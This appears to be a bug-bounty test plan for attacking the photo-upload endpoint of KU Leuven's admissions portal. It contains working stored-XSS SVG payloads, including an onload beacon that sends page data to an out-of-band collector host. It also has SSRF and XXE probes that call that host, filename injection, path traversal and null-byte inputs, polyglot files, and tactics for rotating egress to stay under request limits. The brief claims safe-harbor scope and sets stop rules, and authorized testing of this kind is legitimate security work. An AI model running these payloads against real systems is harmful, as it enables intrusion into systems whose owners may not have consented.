# VM BRIEF — KU Leuven Admissions — Track G: the ApplicantPhotos upload surface

**Why this is the last real shot, and why it's a good one.** Every authorization path we've
tested — direct CRUD, batch dispatch, FunctionImports, composite keys, identity/context
confusion — came back clean. The team locked entity writes properly. But `ApplicantPhotos` is a
**different code path**: a raw-XHR binary upload with **two client-controlled metadata values**
(`Content-Type` and a filename inside the `slug` header) landing in a **SAP ArchiveLink content
repository**, read back verbatim via `GET /ApplicantPhotos('0')/$value`. Binary upload + archive
storage + a `$value` re-serve is exactly the corner where SAP shops slip, because the OData authz
filter that guards entity fields doesn't sit on the ArchiveLink byte path. This is the same class
as the researcher's Bank Van Breda `AttachmentDto.FileName` win — but here we can test it live.

A photo is now uploaded on account A, so every probe below has a baseline to diff against.

**Everything is own-account (A's photo, A's session) except the explicit cross-tenant probes,
which use our own second account B.** In scope: `webwsp.aps.kuleuven.be/.../ZC_AD_APPLICANT_SRV/*`
plus the `$value` byte endpoint. Out: IdP, `esap/public/*`, `webwsd`/`webwsq`, and — critically —
if any server-side-fetch probe (G3) fires against our OOB collector, we **stop and report the
capability; we do NOT then point it at internal infrastructure.** Detection only.

## Guardrails (unchanged) + upload-specific notes

- Target-ID guard ON; A/B only; IMMEDIATE-STOP on foreign PII; session-death detection ON.
- ACL: raw-XHR uploads are non-safe POSTs — cap **≤10 non-safe per egress**, rotate between
  phases, interleave with 3–5 legit-shaped GETs (`/Applicants('0')`, `/ApplicantPhotos('0')`).
- **Mandatory restore:** capture A's current real photo bytes + its metadata BEFORE any upload
  (`GET /ApplicantPhotos('0')/$value` → save; `GET /ApplicantPhotos('0')` → save the entity). In
  `finally:`, re-upload the original so A's account is left as found. Verify by byte-compare.
- **No alert() payloads** in anything that could render on a real screen before cleanup — use
  inert markers and OOB callbacks only. An `alert()` that fires on a staff reviewer's screen is
  both noisy and rude; a silent OOB beacon proves the same thing.

## Pre-flight: stand up an OOB collector

Before G1.4 and G3, start an interactsh listener (or equivalent). Record its host. It's used in
exactly two places: the stored-XSS beacon payload (G1.4) and the server-side-fetch probe (G3).
Keep it out of every other payload so the callback surface stays small and attributable.

---

## G1 — Content-Type reflection → stored XSS (the core)

The hypothesis: the `$value` re-serve honors the Content-Type stored at upload, so an
`image/svg+xml` or `text/html` blob renders as active content when a browser loads the photo URL.

### G1.0 — Baseline the serve behavior

`GET /ApplicantPhotos('0')/$value` on A's real photo. Record **exactly**:
- The response `Content-Type` header
- Whether `X-Content-Type-Options: nosniff` is present
- `Content-Disposition` (inline vs attachment — attachment neuters most XSS)
- Any `Content-Security-Policy` on the response
- The response host/path the browser would treat as the origin

These four headers decide whether *any* reflected type is exploitable. Capture before probing.

### G1.1 — SVG with script, native image MIME

Upload a blob whose bytes are:
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <script>/*KLG_SVG_MARKER*/</script>
</svg>
```
with `Content-Type: image/svg+xml`, `slug: "ZCM_ADM027|klg_probe.svg"`. Then
`GET /ApplicantPhotos('0')/$value` and record the served Content-Type + whether the SVG bytes
came back verbatim. SVG is the cleanest vector because it is a *legitimate* image MIME that
natively executes script — an image allowlist that permits SVG is already XSS-exploitable.

### G1.2 — text/html and xhtml variants

Two more uploads (separate, with restore between if budget allows, else back-to-back then one
restore): `Content-Type: text/html` with an HTML body carrying `<!--KLG_HTML_MARKER-->`, and
`Content-Type: application/xhtml+xml`. Record served type each time. xhtml sometimes slips
allowlists that check for the literal string `text/html`.

### G1.3 — Sniffing / polyglot bypass (if G1.1–G1.2 show the type is FORCED to image/*)

If the server overrides your Content-Type to a fixed `image/jpeg`/`image/png`, exploitation isn't
dead — it depends on `nosniff` (from G1.0) and polyglots:
- If `nosniff` is **absent**, upload a **polyglot**: a file that is a byte-valid JPEG (correct
  `FFD8FF` magic + minimal APP0) with HTML/JS appended after the image data. Some browsers, and
  many downstream document viewers, sniff to HTML. Marker `KLG_POLY_MARKER`.
- Test a **GIF/JS polyglot** (`GIF89a` header that's also valid JS) if any context loads the
  photo as a script src.
- Record whether the served bytes are the untouched polyglot (server stored raw) or
  transcoded/stripped (server re-encoded the image — which would *also* be an interesting finding:
  it means the server processes the bytes → see G3).

### G1.4 — The stored-XSS beacon (only after G1.0 shows an exploitable serve)

If G1.0 showed `Content-Type` reflected + no `nosniff` + inline disposition, upload one SVG whose
onload silently beacons:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='//<OOB>/klg?u='+encodeURIComponent(location.href)"/>
```
Then load `/ApplicantPhotos('0')/$value` **from a browser context in the same session** (or note
that the applicant's own profile page renders it — see G4). A callback proves execution in the
authenticated origin. **No cookie exfil in the payload** — `location.href` is enough to prove
render; keep it minimal. Restore immediately after.

---

## G2 — The `slug` as an injection + routing primitive (creative core)

The `slug` is `ZCM_ADM027|<filename>`. Two independently interesting halves.

### G2.1 — Filename injection (the Bank-Van-Breda parallel)

The `<filename>` after the pipe. Upload with filenames (one per upload, marker in a distinct
field so you can tell them apart on read):
- `<img src=x onerror=/*KLG_FN*/>.jpg` — HTML metacharacters
- `..%2f..%2f..%2fklg_trav.jpg` and `../../klg_trav.jpg` — path traversal in the archive store
- A very long filename (4 KB) — buffer/truncation behavior
- Filename with a null byte `klg%00.jpg` — SAP has a history of NUL-in-metadata bugs

For each: `GET /ApplicantPhotos('0')` (the entity, not `$value`) and check whether `fileName`
came back verbatim, encoded, stripped, or truncated. **Where does `fileName` render?** — the
metadata field is the payload carrier; G4 determines whether it reaches a DOM.

### G2.2 — The doc-type code as a routing primitive (the genuinely novel angle)

`ZCM_ADM027` is the SAP ArchiveLink **document type** — it maps the upload to a content repository
and a workflow. The client only ever sends `ZCM_ADM027`. Test whether the server accepts a
**different** doc-type code, because each ArchiveLink type can have its own MIME allowlist,
its own review queue, and its own render context:
- `ZCM_ADM028`, `ZCM_ADM026` (adjacent admission types — a photo stored as a *different*
  admission document could land in a reviewer's document list rather than the photo widget)
- `ZCM_ADM_LETTER` / any type name that suggests an *outbound* document (if an applicant can
  write into the admission-letter document store, that is a forgery primitive far bigger than XSS)
- A malformed / empty type before the pipe

For each accepted type: read back and note **where** the document surfaces (does it appear under
Attachments? SubmitChecks? a follow-up doc list?). **If a photo upload can be stored under a
document type meant for staff-authored or outbound documents, STOP and report** — that's the
crown jewel this whole track was hunting, arriving through the upload door instead of the OData
door. Restrict this to reading back on *own* account; do not attempt to write into B's document
space here (that's G5).

---

## G3 — Server-side image processing (XXE / SSRF detection — detection ONLY)

If G1.3 showed the server **re-encodes or thumbnails** the image (served bytes ≠ uploaded bytes),
the server is *processing* the image server-side — which opens image-library attack surface.
Probe for outbound-fetch capability with our OOB collector, **detection only**:

- **SVG external image reference:**
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://<OOB>/klg_svg_ssrf" height="1" width="1"/>
  </svg>
  ```
  Upload with `Content-Type: image/svg+xml`. If the OOB collector logs a hit from a KU Leuven
  server IP, the server fetched the URL while processing → server-side SSRF via SVG.
- **SVG/XML external entity (XXE):**
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://<OOB>/klg_xxe">]>
  <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
  ```
  A callback proves the XML parser resolves external entities.

**Hard stop rule:** if either callback fires, that is the finding. Log the source IP + timestamp,
write it up, and **do NOT** re-point the entity/href at `169.254.169.254`, internal hostnames, or
`file://` — we've proven the capability; escalating to internal targets is beyond proof and out of
safe-harbor. Report the detection and let the program confirm internal impact.

Budget: 2 uploads. Only run if G1.3 indicated server-side processing; if the server stores bytes
verbatim (no processing), skip G3 — no processor to attack.

---

## G4 — Render-context investigation (decides self-XSS vs cross-user — the severity multiplier)

A stored payload is only as valuable as *who renders it*. This is a **static + light-GET** phase,
no uploads:

1. From the extracted client bundle (`03-bundle/`), find every place the photo and its `fileName`
   are bound. We already know `Main._getPicture` → `Image.setSrc('/ApplicantPhotos('0')/$value')`.
   Grep the views for `ApplicantPhoto`, `photo`, `fileName`, `Image src`, and any staff-shared
   fragment.
2. Determine the render context of `$value`: is it an `<img src>` (SVG-as-img does NOT run script
   in modern browsers — important!), an `<object>`/`<iframe>`/direct navigation (SVG DOES run), or
   a CSS `background-image` (no script)? **This is decisive.** If the only render is `<img src>`,
   the SVG-script vector is neutered for the *photo* and the real value shifts to G2 (filename in a
   text context) and G3 (server-side processing). Document which contexts exist.
3. **The cross-user question:** is there any evidence — in the bundle, the i18n keys, or the
   metadata — that a *staff reviewer* views the applicant photo or the `fileName`? The
   `uploadedBy` / archive metadata fields (seen in the ApplicantPhotos entity) hint at a
   staff-facing review UI. We can't reach the staff UI, but if the same `$value` URL or `fileName`
   field is what a reviewer's screen would load, the cross-user render is architectural (same
   argument that carried the Bank Van Breda report). Write the argument explicitly with
   file:line evidence.

---

## G5 — Cross-tenant upload/read (fold in the F2.3 re-test now that A has a photo)

- **Cross-tenant read:** from A's session, `GET /ApplicantPhotos('0')/$value` (own, control) then
  attempt a keyed read at B's account id if the entity supports a non-`'0'` key. Does it 403,
  self-substitute to A, or leak B's photo? ~2 GETs.
- **Cross-tenant write:** can A's raw-XHR POST target B's photo slot (a keyed POST, or a `slug`
  naming B's account)? If the upload endpoint accepts a target other than the caller's `'0'`
  alias, that's a cross-tenant write. Test with an inert marker blob; if it lands in B's slot,
  STOP + report + restore B. ~2 non-safe. **Only run after G1–G2 so we understand the endpoint.**

---

## Priority order (ACL-disciplined, one egress each)

1. **G1.0 + G1.1 + G1.2** — baseline serve headers + SVG/html reflection. This alone answers the
   core question. (~4 non-safe + GETs.) If G1.0 shows reflected type + no nosniff + inline → the
   finding is essentially made; go to G1.4 to beacon-confirm.
2. **G4** — render-context (static + light GET; no ACL weight). Do this *alongside* interpreting
   G1 — it decides whether G1 is self-XSS or cross-user.
3. **G2.1 + G2.2** — filename injection + doc-type routing. (~6 non-safe.)
4. **G3** — only if G1.3 showed server-side processing. (~2 non-safe.)
5. **G5** — cross-tenant. (~4 non-safe.)

Between every upload phase: restore A's original photo, verify, interleave legit GETs, rotate
egress if the non-safe count approaches ~10.

## Deliverables

- `06-track-g-photo-upload.md` — per-phase results with the G1.0 header table front-and-center
  (it's the linchpin), the doc-type routing results, and the G4 render-context argument.
- `06-track-g-evidence/` — served-response header dumps, the polyglot file, OOB callback logs
  (if any), and the client-bundle file:line citations for the render context.
- Append request rows to `02-authz-matrix.jsonl` with `"sweep": "g1"` etc.

## Verdict framing (top of the file)

- **STORED XSS — CROSS-USER RENDER** — reflected active type + a render context that runs script +
  a staff-facing render path. The prize.
- **STORED XSS — SELF ONLY** — reflected/executes but only in the applicant's own `<img>`/nav
  context; document honestly (this is the bank's situation, and you know how that triaged).
- **SERVER-SIDE FETCH (SSRF/XXE)** — G3 callback fired. Separate, potentially higher-severity
  finding; report the capability, do not escalate to internal targets.
- **DOC-TYPE ROUTING ABUSE** — a photo stored under a non-photo/outbound document type.
- **CLEAN NEGATIVE** — type forced to image, nosniff set, attachment disposition, bytes
  re-encoded, filename encoded, doc-type locked. If it's clean here too, KU Leuven's applicant
  surface is genuinely exhausted and we close it with a thorough negative.

## Non-goals

No `alert()` on renderable payloads (OOB beacons only). No escalating a confirmed SSRF/XXE to
internal targets — detection + report only. No IdP / `esap/public` / `webwsd` / `webwsq`. Cross-
tenant probes use our own B account and stop-and-restore on any successful cross-write.
